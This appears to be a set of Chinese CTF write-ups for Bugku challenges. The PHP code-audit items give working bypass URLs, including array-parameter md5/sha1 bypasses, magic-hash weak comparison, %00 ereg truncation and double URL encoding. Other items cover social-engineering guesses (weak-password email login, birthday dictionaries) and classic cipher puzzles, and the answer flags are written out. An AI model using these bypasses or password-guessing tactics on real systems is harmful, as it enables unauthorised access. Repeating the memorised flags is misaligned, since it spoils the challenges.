			flag{bugku_dmsj_912k}

3. urldecode二次编码绕过 50

		http://120.24.86.145:9009/10.php
		
		<?php
		if(eregi("hackerDJ",$_GET[id])) {
		echo("
		
		not allowed!
		");
		exit();
		}
		$_GET[id] = urldecode($_GET[id]);
		if($_GET[id] == "hackerDJ")
		{
		echo "
		
		Access granted!
		";
		echo "
		
		flag
		";
		}
		?>

	解答：
	
		url二次编码绕过
		http://120.24.86.145:9009/10.php?id=%2568ackerDJ
		flag{bugku__daimasj-1t2} 

4. md5()函数 50

		http://120.24.86.145:9009/18.php
		
		<?php
		error_reporting(0);
		$flag = 'flag{test}';
		if (isset($_GET['username']) and isset($_GET['password'])) {
		if ($_GET['username'] == $_GET['password'])
		print 'Your password can not be your username.';
		else if (md5($_GET['username']) === md5($_GET['password']))
		die('Flag: '.$flag);
		else
		print 'Invalid password';
		}
		?>

	解答：

		md5函数特性，无法处理数组，返回false
		http://120.24.86.145:9009/18.php?username[]=1&password[]=2
		flag{bugk1u-ad8-3dsa-2}

5.数组返回NULL绕过 50

		http://120.24.86.145:9009/19.php
		
		<?php
		$flag = "flag";
		
		if (isset ($_GET['password'])) {
		if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
		echo 'You password must be alphanumeric';
		else if (strpos ($_GET['password'], '--') !== FALSE)
		die('Flag: ' . $flag);
		else
		echo 'Invalid password';
		}
		?>

	解答：

		GET方式提交password，然后用ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母，继续strlen()限制了长度小于8并且大小必须大于9999999，继续strpos()对password进行匹配，必须含有-，最终才输出flag

		因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。对于另一个难题可以使用科学计数法表示，计算器或电脑表达10的的幂是一般是e，也就是1.99714e13=19971400000000，所以构造1e8即100000000 > 9999999，在加上-。于是乎构造password=1e8%00*-*,成功得到答案

		http://120.24.86.145:9009/19.php?password=1111%00--
		flag{ctf-bugku-ad-2131212}

6. sha()函数比较绕过 60

		http://120.24.86.145:9009/7.php
		
		<?php
		$flag = "flag";
		if (isset($_GET['name']) and isset($_GET['password']))
		{
		var_dump($_GET['name']);
		echo "
		";
		var_dump($_GET['password']);
		var_dump(sha1($_GET['name']));
		var_dump(sha1($_GET['password']));
		if ($_GET['name'] == $_GET['password'])
		echo '
		
		Your password can not be your name!
		';
		else if (sha1($_GET['name']) === sha1($_GET['password']))
		die('Flag: '.$flag);
		else
		echo '
		
		Invalid password.
		';
		}
		else
		echo '
		
		Login first!
		';
		?>

	解答：

		sha1绕过漏洞
		hash函数无法处理数组
		http://120.24.86.145:9009/7.php?name[]=1&password[]=2
		flag{bugku--daimasj-a2}

7. md5加密相等绕过 60

		http://120.24.86.145:9009/13.php
		
		<?php
		$md51 = md5('QNKCDZO');
		$a = @$_GET['a'];
		$md52 = @md5($a);
		if(isset($a)){
		if ($a != 'QNKCDZO' && $md51 == $md52) {
		echo "flag{*}";
		} else {
		echo "false!!!";
		}}
		else{echo "please input a";}
		?>

	解答：

		http://120.24.86.145:9009/13.php?a=240610708
		MD5(240610708)==MD5(QNKCDZO)
		php弱类型绕过
		flag{bugku-dmsj-am9ls}

8. 十六进制与数字比较 60

		http://120.24.86.145:9009/20.php
		
		<?php
		error_reporting(0);
		function noother_says_correct($temp)
		{
		$flag = 'flag{test}';
		$one = ord('1'); //ord — 返回字符的 ASCII 码值
		$nine = ord('9'); //ord — 返回字符的 ASCII 码值
		$number = '3735929054';
		// Check all the input characters!
		for ($i = 0; $i < strlen($number); $i++)
		{
		// Disallow all the digits!
		$digit = ord($temp{$i});
		if ( ($digit >= $one) && ($digit <= $nine) )
		{
		// Aha, digit not allowed!
		return "flase";
		}
		}
		if($number == $temp)
		return $flag;
		}
		$temp = $_GET['password'];
		echo noother_says_correct($temp);
		?>

	解答：

		十六进制等价于数字，十六进制编码
		http://120.24.86.145:9009/20.php?password=0xdeadc0de
		flag{Bugku-admin-ctfdaimash}
		
9. ereg正则%00截断 100

		http://120.24.86.145:9009/5.php
		<?php
		$flag = "xxx";
		if (isset ($_GET['password']))
		{
		if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
		{
		echo '
		
		You password must be alphanumeric
		';
		}
		else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
		{
		if (strpos ($_GET['password'], '-') !== FALSE) //strpos — 查找字符串首次出现的位置
		{
		die('Flag: ' . $flag);
		}
		else
		{
		echo('
		
		- have not been found
		');
		}
		}
		else
		{
		echo '
		
		Invalid password
		';}}
		?>

	解答：

		ereg()%00截断
		strlen()
		科学计数法绕过
		strpos()
		http://120.24.86.145:9009/5.php?password=1e9%00*-*
		flag{bugku-dm-sj-a12JH8}

10. strpos数组绕过 150

		http://120.24.86.145:9009/15.php
		
		<?php
		$flag = "flag";
		if (isset ($_GET['ctf'])) {
		if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE)
		echo '必须输入数字才行';
		else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)
		die('Flag: '.$flag);
		else
		echo '骚年，继续努力吧啊~';
		}
		?>

	解答：

		strpos绕过，strpos()找的是字符串,那么传一个数组给它,strpos()出错返回null,null!==false
		http://120.24.86.145:9009/15.php?ctf[]=1%00#biubiubiu
		http://120.24.86.145:9009/15.php?ctf=1%00%23biubiubiu
		flag{Bugku-D-M-S-J572}

##社工 Society
1. 密码
50

姓名：张三
生日；19970315

KEY格式KEY{xxxxxxxxxx}

解答：

	mima.py
	构造社工字典爆破
	读取字典文件，构造flag字符串（列表）
	提交flag字符串，验证正确性

2. 信息搜集
	解答：

		搜索引擎黑客
		Google hack
		参考：https://www.cnblogs.com/xuanhun/p/3910134.html
		site:toutiao.com bugku.cn
		KEY{462713425}
	
3. 简单个人信息收集
	zip伪加密
	社工库
	flag{15206164164}

4. 社工进阶 100  
	>name:孤长离
	>提示：弱口令

	top100弱口令
	a123456
	KEY{sg1H78Si9C0s99Q}
	
	python登录邮箱

5. 简单的社工尝试 150
	>这个狗就是我画的，而且当了头像
	>这题提示的其实很明显了
	>想想吧

	解答：
	
		google搜索图片
		发现一个bugku的关键字，打开网页：
			github.com/bugku
		个人信息下有微博的链接地址：
			https://weibo.com/bugku?is_all=1
		其中有一条状态是：
			c.bugku.com/13211.txt
		打开后得到flag
			flag{BUku_open_shgcx1}


##加解密 CRYPTO
1. 滴答~滴 20  
	>-... -.- -.-. - ..-. -- .. ... -.-.
	>答案格式KEY{xxxxxxxxx}

	解答：

		摩斯密码
		KEY{BKCTFMISC}

2. 聪明的小羊 20
	>一只小羊翻过了2个栅栏
	>KYsd3js2E{a2jda}
	
	解答：
		
		栅栏密码，第三栏得到结果
		KEY{sad23jjdsa2}

3.ok  
	解答：
	
	Ook编程语言，Ook! 与Brainfuck类似, 但用单词“Ook！”，“Ook.” 和“Ook?”代替。
	破解地址：http://tool.bugku.com/brainfuck/
	flag{ok-ctf-1234-admin}
	13种最为荒谬的编程语言：http://news.mydrivers.com/1/190/190926.htm

4.这不是摩斯密码 30  
		
		+++++ +++++ [->++ +++++ +++<] >++.+ +++++ .<+++ [->-- -<]>- -.+++ +++.<
		++++[ ->+++ +<]>+ +++.< +++[- >---< ]>--- .---- .<+++ ++++[ ->--- ----<
		]>--- ----- ----- .<+++ ++++[ ->+++ ++++< ]>+++ ++.<+ +++++ +[->- -----
		-<]>. <++++ ++++[ ->+++ +++++ <]>++ .<+++ [->-- -<]>- ----. <++++ +++[-
		>---- ---<] >---- ----. +++++ +..++ +++.+ .<+++ [->-- -<]>- --.<+ +++++
		+[->+ +++++ +<]>+ ++.++ +.+++ +++++ +.--- -.+++ ++.<+ ++[-> +++<] >++++
		++.<

	brainfuck编码

		flag{ok-c2tf-3389-admin}

5. 简单加密 60
	>e6Z9i~]8R~U~QHE{RnY{QXg~QnQ{^XVlRXlp^XI5Q6Q6SKY8jUAA

	解答：

		http://blog.csdn.net/qq_40980391/article/details/79144780

		#encoding=UTF-8
		import base64
		str='e6Z9i~]8R~U~QHE{RnY{QXg~QnQ{^XVlRXlp^XI5Q6Q6SKY8jUAA'
		s=''
		for c in str:
			s+=chr(ord(c)-4)
		key=base64.b64decode(s)
		print key

		key{68743000650173230e4a58ee153c68e8}

6. 一段Base64 80
	>flag格式：flag{xxxxxxxxxxxxx}

	解答：

		base64解密
		plain1 = cipher1.decode('base64')
		8进制编码
			cipher2 = re.findall(r'\d+', cipher2)
			for i in cipher2:
    			plain2 += chr(int(i, 8))
		16进制编码
			cipher3 = re.findall(r'\d+', cipher3)
			for i in cipher3:
    			plain2 += chr(int(i, 16))
		unicode编码
			cipher4 = re.findall(r'u[\d\w]+', cipher4)
			cipher4 = ''.join(cipher4).replace('u', '\u')
			plain4 = cipher4.decode('unicode-escape').encode('utf-8')
		数字转ASCII
			cipher5 = re.findall('\d+', cipher5)
			for i in cipher5:
    			plain5 += chr(int(i))
		cipher6 = re.findall(r'\d+\w?', cipher6)
		for i in cipher6:
    		plain6 += chr(int(i, 16))
		for i in cipher7:
			flag += unichr(int(i))
		flag = urllib.unquote(flag)					
		flag{ctf_tfc201717qwe}

7. .!? 80
	>
	..... ..... ..... ..... !?!!. ?.... ..... ..... ..... .?.?! .?... .!...
	..... ..... !.?.. ..... !?!!. ?!!!! !!?.? !.?!! !!!.. ..... ..... .!.?.
	..... ...!? !!.?. ..... ..?.? !.?.. ..... .!.?. ..... ..... !?!!. ?!!!!
	!!!!! !?.?! .?!.? ..... ....! ?!!.? ..... ...?. ?!.?. ..... !.?.. .....
	!?!!. ?!!!! !!?.? !.?!! !!!!! !!!!. ..... ...!. ?.... ...!? !!.?. .....
	?.?!. ?..!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? .....
	..!?! !.?.. ....? .?!.? ....! .!!!. !!!!! !!!!! !!!!! !!.?. ..... .!?!!
	.?... ...?. ?!.?. ..... !.!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?!
	.?... ..... !.?.


8. +[]- 80
	>
	+++++ +++++ [->++ +++++ +++<] >++.+ +++++ .<+++ [->-- -<]>- -.+++ +++.<
	++++[ ->+++ +<]>+ +++.< +++++ [->-- ---<] >.<++ ++[-> ++++< ]>+++ .<+++
	[->-- -<]>- ----. ++++. <+++[ ->+++ <]>+. <++++ [->-- --<]> ----- -.<++
	+[->+ ++<]> ++.-. ----- ---.< +++[- >+++< ]>+++ .---- .<+++ [->-- -<]>-
	.<+++ +++[- >---- --<]> ----- ----. +.<++ +++++ +[->+ +++++ ++<]> +++++
	+++++ .<

	解答：

		brainfuck
		http://tool.bugku.com/brainfuck/
		flag{bugku_jiami_23}
		jother/jsfuck编码

9. 奇怪的密码 100
	>突然天上一道雷电
	>gndk€rlqhmtkwwp}z

	解答：

		累次加密
		#encoding=UTF-
		import string
		
		str='gndk{rlqhmtkwwp}z'
		length=len(str)
		#print length
		#print str[16]
		
		flag=''
		for i in range(0,17):
			#print str[i]
			flag+=chr(ord(str[i])-i-1)
			
		print flag
		#flag{lei_ci_jiami}

10. 托马斯.杰斐逊 100

		1： <ZWAXJGDLUBVIQHKYPNTCRMOSFE <
		2： <KPBELNACZDTRXMJQOYHGVSFUWI <
		3： <BDMAIZVRNSJUWFHTEQGYXPLOCK <
		4： <RPLNDVHGFCUKTEBSXQYIZMJWAO <
		5： <IHFRLABEUOTSGJVDKCPMNZQWXY <
		6： <AMKGHIWPNYCJBFZDRUSLOQXVET <
		7： <GWTHSPYBXIZULVKMRAFDCEONJQ <
		8： <NOZUTWDCVRJLXKISEFAPMYGHBQ <
		9： <QWATDSRFHENYVUBMCOIKZGJXPL <
		10： <WABMCXPLTDSRJQZGOIKFHENYVU <
		11： <XPLTDAOIKFZGHENYSRUBMCQWVJ <
		12： <TDSWAYXPLVUBOIKZGJRFHENMCQ <
		13： <BMCSRFHLTDENQWAOXPYVUIKZGJ <
		14： <XPHKZGJTDSENYVUBMLAOIRFCQW <
		
		密钥： 2,5,1,3,6,4,9,7,8,14,10,13,11,12
		
		密文：HCBTSXWCRQGLES
		
		flag格式 flag{你解密的内容}
	
	轮盘加密，写出破解脚本即可lunpan.py


15. zip伪加密  
	zip文件头格式详解
	
		http://blog.csdn.net/wclxyn/article/details/7288994
		http://blog.csdn.net/pdsu161530247/article/details/73612910

		压缩源文件数据区：50 4B 03 04：这是头文件标记
		压缩源文件目录区：
		50 4B 01 02：目录中文件文件头标记
		3F 00：压缩使用的 pkware 版本 
		14 00：解压文件所需 pkware 版本 
		00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）
		压缩源文件目录结束标志 ：50 4B 05 06：目录结束标记

		flag{Adm1N-B2G-kU-SZIP}